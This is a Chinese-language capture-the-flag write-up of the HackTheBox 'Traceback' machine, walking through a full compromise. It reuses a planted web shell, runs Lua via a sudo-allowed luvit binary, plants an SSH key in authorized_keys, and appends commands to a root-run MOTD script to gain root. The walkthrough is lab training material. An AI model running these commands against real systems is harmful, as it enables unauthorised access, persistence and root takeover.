---
title: HackTheBox::Traceback
date: 2020-07-17
image: https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180751.png
description: 
categories: 
- 渗透
tags:
- 提权
---
打开是一个黑页

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180759.png)

看源码有一句hint：

```
<!--Some of the best web shells that you might need ;)-->
```

 

### 利用已有的webshell获得webadmin权限

扫目录，无果，尝试直接Google这句话，果然找到了作者的Github，在作者列出的一堆shell里面一个个尝试，最后找到了[smevk.php](https://github.com/Xh4H/Web-Shells/blob/master/smevk.php)，用户密码admin就进去了，然后直接上传文件getshell。

在/home目录下发现两个文件夹，其中sysadmin没有权限访问，webadmin里面有个note.txt：

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

 

然后我们可以查看webadmin的.bash_history：

.bash_history

 

 

好吧其实这才是原版：

```
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
```

大概就是通过 `/home/sysadmin/luvit` 这个东西来执行lua脚本，找了半天并没有找到privesc.lua，我们可以新建一个来执行，由于lua可以用sysadmin权限执行，我们得以读取/home/sysadmin/user.txt；

查看webadmin的权限：

```
(webadmin:/var/www/html) $ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
(webadmin:/var/www/html) $
```

privesc.lua：

```
os.execute("ls /home/sysadmin/")
os.execute("cat /home/sysadmin/user.txt")
```

 

两次分别用蚁剑终端执行：

```
(webadmin:/home/webadmin) $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
luvit
user.txt
(webadmin:/home/webadmin) $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
faca73f508ba5f752100d6de13500714
(webadmin:/home/webadmin) $
```

 

### 写公钥获得sysadmin的SSH

运行命令生成RAS公私钥对：

```
ssh-keygen -t rsa
```

 

保存到当前目录，我们可以看到生成了两个文件：

```
root@wh1sper:~/HTB/machine/Traceback# ls -a
.  ..  id_rsa  id_rsa.pub  pspy64  pspy64s  unix-privesc-check  unix-privesc-check.tar
root@wh1sper:~/HTB/machine/Traceback#
```

其中 `id_rsa.pub` 是公钥，我们利用webshell把他上传到 `/home/username/.ssh/authorized_keys` 这个文件里面就可以获得这个user的权限。

既然lua脚本可以读写sysadmin的目录，我们便利用他写sysadmin的公钥：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180809.png)

 

随后执行命令，用私钥登录SSH：

```
ssh -i id_rsa sysadmin@10.10.10.181
```

可以看到我们是sysadmin了。

 

### 利用pspy工具在没有root的情况下监视高权限进程



pspy工具地址：

https://github.com/DominicBreuker/pspy

https://github.com/Tib3rius/pspy



利用webshell上传到服务器，在当前目录执行：

```
./pspy64 
```

 

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180819.png)

 

可以看到

标机器每30秒会执行一个cp命令，把一些文件从backup目录复制到/etc/update-motd.d/

```
/bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```

 

我们去查看这个目录下有什么东西：

```
$ cd /etc/update-motd.d/
$ pwd
/etc/update-motd.d
$ ls
00-header  10-help-text  50-motd-news  80-esm  91-release-upgrade
$ cat 00-header
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 
[ -r /etc/lsb-release ] && . /etc/lsb-release
 
 
echo "\nWelcome to Xh4H land \n"
$ 
```

 

是不是很熟悉呢？在刚刚登录的时候也是见到了这句话： `Welcome to Xh4H land`

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180829.png)

 

随后我们监视到，每次登录SSH都会执行以下命令：

![img](https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/20210120180839.png)

其中能找到这样一条：

```
CMD: UID=0    PID=2007   | /bin/sh /etc/update-motd.d/00-header
```

 

 

### 利用root权限运行的脚本弹shell

目的很明确了，这个00-header脚本是用root执行的，我们测试一下：

```
$ echo 'id' >> 00-header
$ exit
root@wh1sper:~/HTB/machine/Traceback# ssh -i id_rsa sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
 
Welcome to Xh4H land 
 
uid=0(root) gid=0(root) groups=0(root)
 
 
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
Last login: Sat Jul 18 02:23:33 2020 from 10.10.14.98
$
```

 

 

id被执行了。不过这个00-header文件好像一直在被还原，手速要快。

弹之：

~~md蜜汁环境弹不过来~~

反正我们知道/root/root.txt，直接`echo 'cat /root/root.txt' >> 00-header`

然后登录就能看到了：

```
echo 'cat /root/root.txt' >> 00-headerroot@wh1sper:~/HTB/machine/Traceback# ssh -i id_rsa sysadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################
 
Welcome to Xh4H land 
 
96c02bb36b51b8f45d59482a4b0c1aba
 
 
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
 
Last login: Sat Jul 18 02:31:58 2020 from 10.10.14.98
$
```

环境一直有人搅屎。。。建议在美国晚上的时候打